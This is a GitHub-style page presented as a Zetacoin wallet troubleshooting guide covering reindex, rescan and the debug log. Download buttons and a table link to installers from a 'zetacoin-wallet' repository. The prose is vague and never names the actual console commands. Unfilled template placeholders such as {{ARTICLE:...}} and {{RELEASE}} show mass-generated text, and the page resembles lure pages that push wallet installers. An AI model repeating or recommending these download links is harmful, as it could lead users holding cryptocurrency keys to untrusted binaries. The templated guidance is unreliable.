![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Reindex, Rescan and Read Logs in Zetacoin</h1>

<p align="center">Diagnosis first, then the numbered fix, then the setting that stops it happening again.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

A reindex rebuilds the chain database, a rescan re-reads the chain to find transactions belonging to your keys, and the debug log records what the client did. Use a rescan after restoring `wallet.dat`, a reindex after a database error, and the log when neither symptom is clear. All three are console or configuration operations, not reinstalls.

## Which operation you need

The three get conflated constantly, and using the wrong one wastes hours. The symptom decides.

| Symptom | Operation | What it does |
| --- | --- | --- |
| Balance missing after restoring a wallet file | rescan | walks the chain looking for your keys |
| Client will not start, or reports a database error | reindex | discards and rebuilds the block index |
| Chain stuck at a height that never advances | reindex, then resync | rebuilds from blocks on disk |
| No visible error, behaviour unclear | read the log | records peers, blocks and errors |
| Transactions missing but balance correct | rescan | re-reads history for the wallet |

Reindex is the heavier operation and takes time proportional to the chain. Rescan is lighter but still walks history, and on a full chain it is not instant.

The full walk-through, with the checks in order, is in [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md).

## Rescanning after a restore

Restoring a `wallet.dat` gives the client keys but not the history that belongs to them. The balance appears only after the client has read the chain and matched transactions to those keys.

The console command to trigger this is the wallet's own rescan call, run once from the debug console, and the client then walks the chain. Progress is not always obvious in the window, so expect the balance to appear late rather than gradually.

If the balance never appears, the file may not be the wallet you think it is, or the coins may belong to the retired chain. {{ARTICLE:restore-zetacoin-wallet-backup}} covers the restore path, and {{ARTICLE:zetacoin-legacy-z-address-coins}} covers the legacy case.

## Reindexing a damaged database

A database error or a client that closes on start usually means the index is inconsistent with the blocks on disk. Reindex throws the index away and rebuilds it from the block files, which repairs the inconsistency without redownloading the chain.

The operation is triggered either from the console or by starting the client with the reindex option. It takes as long as reading the chain takes, which on a full chain is a substantial wait, and the client will look frozen while it works.

Do not interrupt it. An interrupted reindex leaves the index partly built, and the next start repeats the work from the beginning, which is why the operation is best started when the machine can be left alone.

For the background behind this step, [Recover a Lost or Corrupt Zetacoin Wallet](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/recover-a-lost-or-corrupt-file.md) covers the same ground in more detail.

## Reading the log

The client writes a log file into the data directory. It records peer connections, block acceptance, wallet loads and errors, and it is the only place where the sequence of events is visible.

Start from the end and read backwards. The last error before the failure is usually the cause; everything before it is context. A log that ends with peer timeouts is a network problem, one that ends with a database error is a reindex, and one that ends with a wallet load failure is a file problem.

For a support request, the log is the useful attachment. It says what the client tried, which is more informative than what the window showed.

## The console, briefly

The debug console accepts the client's own commands: asking for peer information, block height, wallet state and the rescan and reindex triggers. It is a text interface to the same node the window drives, not a separate tool.

Two cautions. Commands that change state are worth reading twice before pressing enter, and commands that reveal keys should not be run on a machine you do not trust, because the output can contain sensitive material.

## Why a reindex is not a reinstall

People reach for a reinstall when the database is the problem, and a reinstall does not touch the database at all: the data directory survives, including the index that is failing. That is why the same error appears immediately after a clean install.

A reindex is targeted at the failing component. It reads the block files that are already on disk and builds a new index from them, which is both faster than starting over and safer, because nothing is deleted.

That also means a reindex cannot fix a wallet problem, a peer problem or a permission problem. It fixes an index that disagrees with the blocks, and nothing else. If a reinstall changed nothing but the version number, a reindex is usually the operation that was wanted, and {{RELEASE}} is where the build comes from if the version itself is also old.

## When the database is beyond repair

Sometimes the index is not the problem and the chain data itself is inconsistent. In that case the practical move is to start the chain over: close the client, back up `wallet.dat`, move the data directory aside, and let the client sync again, ideally with the bootstrap archive.

That is heavier than a reindex but it is bounded work with a known outcome, which is better than an index that repairs itself into the same error twice.

## Common questions

### Does a reindex delete my coins?

No. It rebuilds the index, not the wallet. Your keys stay in `wallet.dat`, and the balance returns when the index is complete.

### How long does a rescan take?

It reads the chain, so it scales with chain size. On a full chain expect a long wait rather than seconds.

### Can I close the client during a reindex?

You can, but it will start over. Let it finish, or the work is wasted.

### Where is the log file?

In the data directory, next to `wallet.dat` and `zetacoin.conf`. {{ARTICLE:where-is-zetacoin-wallet-dat}} gives the path for each platform.

## The order to try things

Copy the wallet file first, then rescan if the balance is the problem, reindex if the client will not start, and read the log if neither describes what you see. Doing them in the other order means repairing things that were never broken, which is slower and less safe than reading first. {{ARTICLE:zetacoin-wallet-not-syncing-fix}} covers sync failures that are not database problems, {{ARTICLE:recover-lost-zetacoin-wallet-file}} covers a missing file rather than a damaged index, and {{ARTICLE:zetacoin-wallet-resource-usage}} explains why a reindex is heavy on the machine.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Why the Zetacoin Wallet Uses CPU, RAM and Disk](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/why-the-client-uses-cpu-and-ram.md)
- [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md)
- [Fix "No Block Source Available" in Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/fix-no-block-source-error.md)
